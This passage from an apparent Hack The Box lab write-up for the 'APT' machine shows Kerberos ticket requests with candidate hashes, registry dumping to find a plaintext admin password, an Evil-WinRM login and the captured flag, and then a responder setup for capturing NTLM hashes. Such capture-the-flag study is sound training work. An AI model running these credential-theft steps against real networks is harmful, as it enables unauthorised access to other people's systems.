</pre></table></code></div></div><ul><li>https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html</ul><p>Using the <code class="language-plaintext highlighter-rouge">klist</code> tool I found out that the ticket was expired. I had created it the day before, but tickets have a shorter expiration than that.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb.local/henry.vinson@apt.htb | grep -v Impacket | tee -a  valid_hash;done

[*] Saving ticket in henry.vinson@apt.htb.ccache

┌──(zweilos㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/31/2021 20:18:19  04/01/2021 06:18:19  krbtgt/HTB@HTB.LOCAL
     renew until 04/01/2021 20:15:12
</pre></table></code></div></div><p>I ran my one-liner from earlier (on just the valid hash this time) to get a new ticket. I checked it using <code class="language-plaintext highlighter-rouge">klist</code> again and saw that the time was refreshed.</p><h3 id="dumping-the-registry">Dumping the registry</h3><p>I tried dumping the registry again using the same command and this time it took much, much, longer to output (like everything else on this machine so far!). I was sure that it was working this time!! I used the <code class="language-plaintext highlighter-rouge">-s</code> reg option to make it recursively get all keys. I chose <code class="language-plaintext highlighter-rouge">HKEY-USER</code> first since it was a likely place to find potential credentials and other useful system information.</p><ul><li>https://www.lifewire.com/hkey-users-2625903</ul><blockquote><p>Each registry key located under the HKEY_USERS hive corresponds to a user on the system and is named with that user’s security identifier, or SID. The registry keys and registry values located under each SID control settings specific to that user, like mapped drives, installed printers, environment variables, desktop background, and much more, and is loaded when the user first logs on.</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /home/zweilos/.local/bin/reg.py -k apt.htb.local query -keyName HKLM -s | tee regdump_HKLM

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
</pre></table></code></div></div><p>Next I tried to download <code class="language-plaintext highlighter-rouge">HKLM</code> while I perused through <code class="language-plaintext highlighter-rouge">HKU</code>, but I was denied access.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>\Software\Microsoft\Windows\CurrentVersion\Explorer\SearchPlatform\Preferences\
        BreadCrumbBarSearchDefault      REG_SZ   MSNSearch
        DisableAutoNavigateURL  REG_DWORD        0x0
        DisableAutoResolveEmailAddrs    REG_DWORD        0x0
        DisableResultsInNewWindow       REG_DWORD        0x0
        DisableTabbedBrowsing   REG_DWORD        0x0
        EditSavedSearch REG_DWORD        0x0
        IEAddressBarSearchDefault       REG_SZ   MSNSearch
</pre></table></code></div></div><p>Apparently this user never uses this machine, since their default search was MSNSearch. There surprisingly was actually not that much information in this registry dump. I went back and downloaded the entire <code class="language-plaintext highlighter-rouge">HKU</code> hive to include information from all users.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>\Software\Microsoft\Windows\CurrentVersion\Group Policy\GroupMembership\
        Group0  REG_SZ   S-1-5-21-2993095098-2100462451-206186470-513
        Group1  REG_SZ   S-1-1-0
        Group2  REG_SZ   S-1-5-32-545
        Group3  REG_SZ   S-1-5-32-554
        Group4  REG_SZ   S-1-5-4
        Group5  REG_SZ   S-1-2-1
        Group6  REG_SZ   S-1-5-11
        Group7  REG_SZ   S-1-5-15
        Group8  REG_SZ   S-1-2-0
        Group9  REG_SZ   S-1-18-1
        Group10 REG_SZ   S-1-16-8192
        Count   REG_DWORD        0xb
</pre></table></code></div></div><p>The group policy key gave a listing of the groups that existed on this machine. I could use this to look up the well known groups by their SID.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>\Volatile Environment\
        LOGONSERVER     REG_SZ   \\APT
        USERDNSDOMAIN   REG_SZ   HTB.LOCAL
        USERDOMAIN      REG_SZ   HTB
        USERNAME        REG_SZ   henry.vinson
        USERPROFILE     REG_SZ   C:\Users\henry.vinson
        HOMEPATH        REG_SZ   \Users\henry.vinson
        HOMEDRIVE       REG_SZ   C:
        APPDATA REG_SZ   C:\Users\henry.vinson\AppData\Roaming
        LOCALAPPDATA    REG_SZ   C:\Users\henry.vinson\AppData\Local
        USERDOMAIN_ROAMINGPROFILE       REG_SZ   HTB
\Volatile Environment\1\
        SESSIONNAME     REG_SZ   Console
        CLIENTNAME      REG_SZ
</pre></table></code></div></div><p>I reached the end of the file and found some minorly useful information. I started doing some searches to see if I missed something.</p><h3 id="finding-user-creds">Finding user creds</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>\Software\GiganticHostingManagementSystem\
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
</pre></table></code></div></div><p>Searching for <code class="language-plaintext highlighter-rouge">Password</code> yeilded something that I had scrolled right past in my first look through. There was a username and password <code class="language-plaintext highlighter-rouge">henry.vinson_adm:G1#Ny5@2dvht</code>.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ evil-winrm -u henry.vinson_adm -p G1#Ny5@2dvht -i apt.htb.local                                1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents&gt; whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> to log in using these credentials. After all that, I finally had a shell! There were no useful or interesting groups or privileges.</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents&gt; cd ../Desktop
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop&gt; ls


    Directory: C:\Users\henry.vinson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/31/2021   3:46 PM             34 user.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop&gt; type user.txt
0be8b33241a64934480a8ff868aca6ca
</pre></table></code></div></div><p>I found the proof that I had made it inside on the user’s Desktop.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-henryvinson_adm">Enumeration as <code class="language-plaintext highlighter-rouge">henry.vinson_adm</code></h3><p>None of the .exe versions of winPEAS worked on this machine, so I had to run the .bat instead. I was also denied running the <code class="language-plaintext highlighter-rouge">systeminfo</code> command. The .bat version of WinPEAS seemed to be stuck on a loop, so I started poking around in another shell manually using the things it pointed out.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
</pre><td class="rouge-code"><pre>[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop&gt; type C:\Windows\Panther\unattend.xml 
<span class="cp">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span>
<span class="nt">&lt;unattend</span> <span class="na">xmlns=</span><span class="s">"urn:schemas-microsoft-com:unattend"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;settings</span> <span class="na">pass=</span><span class="s">"generalize"</span> <span class="na">wasPassProcessed=</span><span class="s">"true"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-PnpSysprep"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;PersistAllDeviceInstalls&gt;</span>true<span class="nt">&lt;/PersistAllDeviceInstalls&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
   <span class="nt">&lt;/settings&gt;</span>
   <span class="nt">&lt;settings</span> <span class="na">pass=</span><span class="s">"oobeSystem"</span> <span class="na">wasPassProcessed=</span><span class="s">"true"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-Shell-Setup"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;OOBE&gt;</span>
            <span class="nt">&lt;SkipMachineOOBE&gt;</span>true<span class="nt">&lt;/SkipMachineOOBE&gt;</span>
            <span class="nt">&lt;HideEULAPage&gt;</span>true<span class="nt">&lt;/HideEULAPage&gt;</span>
            <span class="nt">&lt;SkipUserOOBE&gt;</span>true<span class="nt">&lt;/SkipUserOOBE&gt;</span>
            <span class="nt">&lt;ProtectYourPC&gt;</span>1<span class="nt">&lt;/ProtectYourPC&gt;</span>
         <span class="nt">&lt;/OOBE&gt;</span>
         <span class="nt">&lt;TimeZone&gt;</span>GMT Standard Time<span class="nt">&lt;/TimeZone&gt;</span>
         <span class="nt">&lt;AutoLogon&gt;</span>
            <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
            <span class="nt">&lt;Username&gt;</span>Administrator<span class="nt">&lt;/Username&gt;</span>
            <span class="nt">&lt;LogonCount&gt;</span>1<span class="nt">&lt;/LogonCount&gt;</span>
            <span class="nt">&lt;Password&gt;</span>*SENSITIVE*DATA*DELETED*<span class="nt">&lt;/Password&gt;</span>
            <span class="nt">&lt;Domain&gt;</span>apt<span class="nt">&lt;/Domain&gt;</span>
         <span class="nt">&lt;/AutoLogon&gt;</span>
         <span class="nt">&lt;UserAccounts&gt;</span>
            <span class="nt">&lt;AdministratorPassword&gt;</span>*SENSITIVE*DATA*DELETED*<span class="nt">&lt;/AdministratorPassword&gt;</span>
         <span class="nt">&lt;/UserAccounts&gt;</span>
         <span class="nt">&lt;FirstLogonCommands&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>net user dsc Password123! /add<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>1<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>net localgroup administrators dsc /add<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>2<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>winrm quickconfig -force<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>3<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>powershell -Command 'Enable-PSRemoting -Force'<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>4<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>powershell -File C:\lcm.ps1<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>5<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
            <span class="nt">&lt;SynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;CommandLine&gt;</span>powershell -enc KABHAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAIAB8ACAARABpAHMAYQBiAGwAZQAtAE4AZQB0AEEAZABhAHAAdABlAHIAQgBpAG4AZABpAG4AZwAgAC0AQwBvAG0AcABvAG4AZQBuAHQASQBEACAAbQBzAF8AdABjAHAAaQBwADYAIAAtAGMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQApAA==<span class="nt">&lt;/CommandLine&gt;</span>
               <span class="nt">&lt;Order&gt;</span>6<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/SynchronousCommand&gt;</span>
         <span class="nt">&lt;/FirstLogonCommands&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
   <span class="nt">&lt;/settings&gt;</span>
   <span class="nt">&lt;settings</span> <span class="na">pass=</span><span class="s">"specialize"</span> <span class="na">wasPassProcessed=</span><span class="s">"true"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-Shell-Setup"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;RegisteredOwner&gt;</span>Administrator<span class="nt">&lt;/RegisteredOwner&gt;</span>
         <span class="nt">&lt;RegisteredOrganization&gt;</span>Managed by Terraform<span class="nt">&lt;/RegisteredOrganization&gt;</span>
         <span class="nt">&lt;ComputerName&gt;</span>apt<span class="nt">&lt;/ComputerName&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-TCPIP"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;Interfaces&gt;</span>
            <span class="nt">&lt;Interface</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;Ipv4Settings&gt;</span>
                  <span class="nt">&lt;DhcpEnabled&gt;</span>false<span class="nt">&lt;/DhcpEnabled&gt;</span>
               <span class="nt">&lt;/Ipv4Settings&gt;</span>
               <span class="nt">&lt;UnicastIpAddresses&gt;</span>
                  <span class="nt">&lt;IpAddress</span> <span class="na">wcm:action=</span><span class="s">"add"</span> <span class="na">wcm:keyValue=</span><span class="s">"1"</span><span class="nt">&gt;</span>10.10.10.86/24<span class="nt">&lt;/IpAddress&gt;</span>
               <span class="nt">&lt;/UnicastIpAddresses&gt;</span>
               <span class="nt">&lt;Ipv6Settings&gt;</span>
                  <span class="nt">&lt;DhcpEnabled&gt;</span>true<span class="nt">&lt;/DhcpEnabled&gt;</span>
               <span class="nt">&lt;/Ipv6Settings&gt;</span>
               <span class="nt">&lt;Identifier&gt;</span>00-50-56-b4-b2-37<span class="nt">&lt;/Identifier&gt;</span>
               <span class="nt">&lt;Routes&gt;</span>
                  <span class="nt">&lt;Route</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
                     <span class="nt">&lt;Identifier&gt;</span>1<span class="nt">&lt;/Identifier&gt;</span>
                     <span class="nt">&lt;Prefix&gt;</span>0.0.0.0/0<span class="nt">&lt;/Prefix&gt;</span>
                     <span class="nt">&lt;NextHopAddress&gt;</span>10.10.10.2<span class="nt">&lt;/NextHopAddress&gt;</span>
                  <span class="nt">&lt;/Route&gt;</span>
               <span class="nt">&lt;/Routes&gt;</span>
            <span class="nt">&lt;/Interface&gt;</span>
         <span class="nt">&lt;/Interfaces&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-DNS-Client"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;Interfaces&gt;</span>
            <span class="nt">&lt;Interface</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;Identifier&gt;</span>00-50-56-b4-b2-37<span class="nt">&lt;/Identifier&gt;</span>
               <span class="nt">&lt;DNSServerSearchOrder&gt;</span>
                  <span class="nt">&lt;IpAddress</span> <span class="na">wcm:action=</span><span class="s">"add"</span> <span class="na">wcm:keyValue=</span><span class="s">"1"</span><span class="nt">&gt;</span>127.0.0.1<span class="nt">&lt;/IpAddress&gt;</span>
               <span class="nt">&lt;/DNSServerSearchOrder&gt;</span>
            <span class="nt">&lt;/Interface&gt;</span>
         <span class="nt">&lt;/Interfaces&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
      <span class="nt">&lt;component</span> <span class="na">name=</span><span class="s">"Microsoft-Windows-Deployment"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span> <span class="na">publicKeyToken=</span><span class="s">"31bf3856ad364e35"</span> <span class="na">language=</span><span class="s">"neutral"</span> <span class="na">versionScope=</span><span class="s">"nonSxS"</span> <span class="na">xmlns:wcm=</span><span class="s">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;RunSynchronous&gt;</span>
            <span class="nt">&lt;RunSynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;Path&gt;</span>C:\sysprep\guestcustutil.exe restoreMountedDevices<span class="nt">&lt;/Path&gt;</span>
               <span class="nt">&lt;Order&gt;</span>1<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/RunSynchronousCommand&gt;</span>
            <span class="nt">&lt;RunSynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;Path&gt;</span>C:\sysprep\guestcustutil.exe flagComplete<span class="nt">&lt;/Path&gt;</span>
               <span class="nt">&lt;Order&gt;</span>2<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/RunSynchronousCommand&gt;</span>
            <span class="nt">&lt;RunSynchronousCommand</span> <span class="na">wcm:action=</span><span class="s">"add"</span><span class="nt">&gt;</span>
               <span class="nt">&lt;Path&gt;</span>C:\sysprep\guestcustutil.exe deleteContainingFolder<span class="nt">&lt;/Path&gt;</span>
               <span class="nt">&lt;Order&gt;</span>3<span class="nt">&lt;/Order&gt;</span>
            <span class="nt">&lt;/RunSynchronousCommand&gt;</span>
         <span class="nt">&lt;/RunSynchronous&gt;</span>
      <span class="nt">&lt;/component&gt;</span>
   <span class="nt">&lt;/settings&gt;</span>
<span class="nt">&lt;/unattend&gt;</span>
</pre></table></code></div></div><p>The output had mentioned a few interesting files. The first I checked was <code class="language-plaintext highlighter-rouge">C:\Windows\Panther\unattend.xml</code>. These unattend files can often hold plaintext credentials. This administrator had been smart enough to remove his credentials afterwards. It did contain some IPs and MAC information that could have been useful during a normal engagement.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">Get-NetAdapter</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Disable-NetAdapterBinding</span><span class="w"> </span><span class="nt">-ComponentID</span><span class="w"> </span><span class="nx">ms_tcpip6</span><span class="w"> </span><span class="nt">-confirm</span><span class="p">:</span><span class="bp">$false</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>The base64 encoded command drew my attention, so I decoded it. It looked as if this was used to disable ipv6?</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\henry.vinson_adm\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="nt">-credential</span><span class="w"> </span><span class="n">administrator</span><span class="w">
</span><span class="n">invoke</span><span class="nt">-command</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</span><span class="w"> </span><span class="nx">lmcompatibilitylevel</span><span class="w"> </span><span class="nt">-Type</span><span class="w"> </span><span class="nx">DWORD</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-Force</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The powershell history file contained something interesting. The administrator credentials had been used to run a scriptblock that set the value of a registry key</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\henry.vinson_adm\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
</span></pre></table></code></div></div><p>I tried to echo the variable from the command in the history file to see if it still existed. Nope. didnt work. :laugh:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level</a><li><a href="https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/">https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/</a><li><a href="https://book.hacktricks.xyz/windows/ntlm">https://book.hacktricks.xyz/windows/ntlm</a></ul><p>Some reasearch revealed some useful information about the registry key that was modified in the command from the history.</p><blockquote><p>The Network security: LAN Manager authentication level setting determines which challenge/response authentication protocol is used for network logons. This choice affects the authentication protocol level that clients use, the session security level that the computers negotiate, and the authentication level that servers accept.</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Send NTLM response only | Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication. | 2
</pre></table></code></div></div><p>A value of ‘2’ meant that NTLM hashes would be sent if they were requested by a service. According to <a href="https://book.hacktricks.xyz/windows/ntlm">hacktricks</a> I could abuse the print spooler service to get the machine to send the hash to my machine, where I could capture it with <code class="language-plaintext highlighter-rouge">responder</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] The challenge must be exactly 16 chars long.
